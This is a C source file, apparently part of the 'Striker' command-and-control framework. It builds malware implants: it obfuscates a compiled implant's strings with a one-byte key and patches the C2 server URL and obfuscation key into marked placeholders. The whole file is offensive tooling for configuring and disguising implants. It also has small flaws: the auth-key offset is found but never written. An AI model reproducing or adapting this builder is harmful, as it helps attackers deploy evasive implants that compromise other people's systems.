/**
 *---------------------------------------------------------------
 *    A preprocessor for the Striker implants.
 * Handles patching, and obfuscation of a newly compiled implant.
 *                                             Author: Umar Abdul
 *---------------------------------------------------------------
 */

#include "obfuscator.h"

const char URL_MARKER[] = "[STRIKER_URL]";
const char AUTH_KEY_MARKER[] = "[STRIKER_AUTH_KEY]";
const char OBFS_KEY_MARKER[] = "[STRIKER_OBFS_KEY]";

int main(int argc, char **argv){
  
  if (argc < 5){
    fprintf(stderr, "[-] Usage: %s <obfs_key> <url> <infile> <outfile>\n", argv[0]);
    return 1;
  }
  char *obfs_key_str = argv[1];
  char *url = argv[2];
  char *infile = argv[3];
  char *outfile = argv[4];
  if (strlen(obfs_key_str) > (sizeof(char) * 20)){
    fprintf(stderr, "[-] OBFS key too long!\n");
    return 1;
  }
  if (strlen(url) > (sizeof(char) * 256)){
    fprintf(stderr, "[-] URL too long!\n");
    return 1;
  }
  unsigned char obfs_key = (unsigned char)atoi(obfs_key_str);

  FILE *rfo = fopen(infile, "r");
  if (!rfo){
    fprintf(stderr, "[-] Error opening input file!\n");
    return 2;
  }
  FILE *wfo = fopen(outfile, "w");
  if (!wfo){
    fprintf(stderr, "[-] Error opening output file!\n");
    return 2;
  }

  // 1. Obfuscate strings.
  obfs_run(wfo, rfo, obfs_key, 1);

  // 2. Patch.
  printf("[*] Finding offsets of our markers...\n");
  rewind(rfo);
  ssize_t obfs_key_offset = obfs_find_offset(rfo, OBFS_KEY_MARKER, strlen(OBFS_KEY_MARKER));
  if (obfs_key_offset == -1){
    fprintf(stderr, "[-] OBFS key marker not found!\n");
    return 3;
  }
  rewind(rfo);
  size_t url_offset = obfs_find_offset(rfo, URL_MARKER, strlen(URL_MARKER));
  if (url_offset == -1){
    fprintf(stderr, "[-] URL marker not found!\n");
    return 3;
  }
  rewind(rfo);
  size_t auth_key_offset = obfs_find_offset(rfo, AUTH_KEY_MARKER, strlen(AUTH_KEY_MARKER));
  if (auth_key_offset == -1){
    fprintf(stderr, "[-] Auth key marker not found!\n");
    return 3;
  }
  printf("[+] Offsets:\n");
  printf("            URL: 0x%08x\n", (unsigned int)url_offset);
  printf("       OBFS Key: 0x%08x\n", (unsigned int)obfs_key_offset);
  printf("       Auth Key: 0x%08x\n", (unsigned int)auth_key_offset);

  // Use the offsets to encode and apply the patch. We will be reusing output file stream.
  printf("[*] Patching...\n");
  // Write the C2 server's URL
  int len = (strlen(url) > strlen(URL_MARKER) ? strlen(url) : strlen(URL_MARKER));
  char *buffer = malloc(sizeof(char) * len);
  memset(buffer, 0, len);
  strncpy(buffer, url, len);
  obfs_encode(obfs_key, buffer);
  fseek(wfo, (long)url_offset, SEEK_SET);
  fwrite(buffer, sizeof(char), len, wfo);
  free(buffer);

  // Write the OBFS key.
  len = (strlen(obfs_key_str) > strlen(OBFS_KEY_MARKER) ? strlen(obfs_key_str) : strlen(OBFS_KEY_MARKER));
  buffer = malloc(sizeof(char) * len);
  memset(buffer, 0, len);
  strncpy(buffer, obfs_key_str, len);
  fseek(wfo, (long)obfs_key_offset, SEEK_SET);
  fwrite(buffer, sizeof(char), len, wfo);
  free(buffer);

  fclose(rfo);
  fclose(wfo);
  return 0;
}
